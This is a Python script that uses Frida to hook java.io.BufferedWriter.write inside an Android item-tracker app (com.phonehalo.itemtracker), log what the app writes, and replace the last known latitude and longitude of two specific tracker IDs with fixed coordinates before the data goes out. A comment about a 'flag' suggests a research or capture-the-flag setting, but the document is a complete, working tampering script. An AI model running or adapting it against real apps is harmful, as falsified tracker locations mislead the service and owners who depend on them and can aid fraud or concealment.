import frida, sys

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

jscode = """
Java.perform(function () {
    // Function to hook is defined here
    var MainActivity = Java.use('java.io.BufferedWriter');

    // Whenever button is clicked
    MainActivity.write.overload('java.lang.String', 'int', 'int').implementation = function (v1, v2, v3) {
        // Show a message to know that the function got called
        send('write is called:' + v1);
        
        // v1 = 'dsds';
        // v3 = 4;

        var retval = 0;
        
        if(v1.toString().includes("latitude") && v1.toString().includes("trackerId") && (v1.toString().includes("000006a1-a06705d6") || v1.toString().includes("0000e443-2d6e1bda"))) {
           // Call the original onClick handler
           console.log('Original stuff:' + v1)
           var allObjs = JSON.parse(v1);
           for (var i = 0; i < allObjs.length; i++) {
               obj = allObjs[i]; 
               obj.lastKnownLocation.latitude = 30.7749;
               obj.lastKnownLocation.longitude = -101.8415702;
           }
           
           v1 = JSON.stringify(allObjs);
           v3 = v1.length;
           retval = this.write(v1, v2, v3);
           console.log('Sending third party trackr info:' + v1.toString());
        } else {
            retval = this.write(v1, v2, v3);
            // Log to the console that it's done, and we should have the flag!
            console.log('General Trackr Info:' + v1.toString() + ', arg 2:' + v2 + ', arg 3:' + v3);
        }
        console.log('Retval:' + retval);
    };
});
"""

process = frida.get_usb_device().attach('com.phonehalo.itemtracker')
script = process.create_script(jscode)
script.on('message', on_message)
print('[*] Running Trckr')
script.load()
sys.stdin.read()
